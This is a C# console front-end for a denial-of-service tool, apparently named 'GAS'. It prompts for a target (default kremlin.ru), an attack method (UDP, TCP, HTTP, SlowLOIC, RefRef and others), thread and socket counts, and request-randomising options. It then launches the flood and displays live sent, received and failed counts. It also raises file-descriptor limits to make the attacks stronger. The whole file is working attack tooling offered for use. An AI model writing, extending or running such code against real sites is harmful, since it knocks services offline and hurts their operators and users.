using System;
using System.Collections.Generic;
using System.Timers;
namespace GAS.TUI
{
    class Program
    {
        static DateTime d;
        static string[] Blacklist = new string[] { "epicm.org", "localhost","127.0.0", "192.168."};
        static GAS.Core.Manager Core = new GAS.Core.Manager();
        public static void Main(string[] args)
        {
            try { Console.Title = "GAS for urkaine"; }
            catch { }
            #region Detect oS
            string temp;
            if (Environment.OSVersion.Platform.ToString().ToLower().Contains("unix"))
                if (Environment.UserName != "root")
                    Console.Error.WriteLine("You are using Linux/Mac OS and you are not root.\r\nIf you want to use ReCoil/SlowLoic attack you must run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\"");
                else
                {
                    Console.WriteLine("Is file open limit unlocked?\r\nIf attack will not give any effect run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\" as root");
                    Console.WriteLine("Do you want to run \"ulimit -n999999\"? [true] (true|false)");
                    if (bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp))
                    {
                        try
                        {
                            System.Diagnostics.Process.Start("ulimit", "-n999999");
                        }
                        catch { }
                    }

                }
            #endregion
            #region Select target
            Console.WriteLine("Select target[kremlin.ru]");
            temp = Console.ReadLine();
            temp = (temp == "" ? "kremlin.ru" : temp);
            foreach(string s in Blacklist)
                if (temp.ToLower().Contains(s))
                {
                    Console.WriteLine("U SUK COX");
                    Environment.Exit(666);
                }
            bool IPOK = Core.LockOn(temp);
            if (!IPOK)
            {
                Console.WriteLine("Wrong Target!");
                Environment.Exit(1);
            }
            #endregion
            #region GetParams
            Console.WriteLine("Subsite is {0}, do you want to change it? [n] (y/n)", Core.Subsite);
            if (Console.ReadLine().ToLower() == "y")
                Core.Subsite = Console.ReadLine();
            Console.WriteLine("Enter port[80]");
            Core.Port = int.Parse((temp = Console.ReadLine()) == "" ? "80" : temp);
            Console.WriteLine("Select attack type [ReCoil] (UDP|TCP|HTTP|ReCoil|SlowLOIC|RefRef|AhrDosme|Post|TMOF)");
            Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), (temp=Console.ReadLine())==""?"ReCoil":temp);
            Console.WriteLine("Enter thread count[50]");
            Core.Threads = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
            Console.WriteLine("Enter sockets per thread [50]");
            Core.SPT = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
            Console.WriteLine("Enter delay [0]");
            Core.Delay = int.Parse((temp = Console.ReadLine()) == "" ? "0" : temp);
            Console.WriteLine("Enter timeout[30]");
            Core.Timeout = int.Parse((temp = Console.ReadLine()) == "" ? "30" : temp);
            Console.WriteLine("USE Get [true]");
            Core.USEGet = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.WriteLine("USE GZIP [true]");
            Core.UseGZIP = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.WriteLine("Wait    For Response [false] ");
            Core.WaitForResponse = bool.Parse((temp = Console.ReadLine()) == "" ? "false" : temp);
            Console.WriteLine("Append RANDOMC hars [true]");
            Core.AppendRANDOMChars = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.WriteLine("Append RANDOM Chars 2 Url [true]");
            Core.AppendRANDOMCharsUrl = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.WriteLine("Starting attack");
            #endregion
#region Start and stop
            Core.Start();
            d = DateTime.Now;
            Console.Clear();
            Timer t = new System.Timers.Timer();
            t.Interval = 500;
            t.Elapsed += new ElapsedEventHandler(t_Elapsed);
            t.Start();
            //attack started
            #region Cool UI
                Console.SetCursorPosition(0, 0);
                Console.WriteLine("GAS 4 anon by github.com/kasthack");
                Console.WriteLine("+++++++++++++++++++++++++++++++++++++++++++++++");
                try
                {
                    Console.SetCursorPosition(0, 6);
                }
                catch { }
                Console.WriteLine("Attacking...");
                Console.WriteLine("Press Enter stop attack and exit");
            #endregion
            Console.ReadLine();
            Console.WriteLine("Exiting, please wait");
            t.Stop();
            Core.Stop();
            Console.Clear();
#endregion
        }

        static void t_Elapsed(object sender, ElapsedEventArgs argZ)
        {
            int x = Console.CursorLeft, y = Console.CursorTop, w = Console.WindowWidth;
            char[] e = new char[w];
            string s;
            int ind = 0;
            for (int i = 0; i < w; e[i++] = ' ') ;
            try
            {
                Console.SetCursorPosition(0, 3);
            }
            catch { }
            Console.WriteLine(e);
            Console.WriteLine(e);
            try
            {
                Console.SetCursorPosition(0, 3);
            }
            catch { }
            Console.WriteLine("Time elapsed\tSent\tReceived\tFailed");
            s = DateTime.Now.Subtract(d).ToString();
            s = s.Substring(0, (ind = s.LastIndexOfAny(new char[] { '.', ',' })) > 0 ? ind : s.Length);
            Console.WriteLine("{0}\t{1}\t{2}\t\t{3}", s, Core.Requested, Core.Downloaded, Core.Failed);
        }
    }
}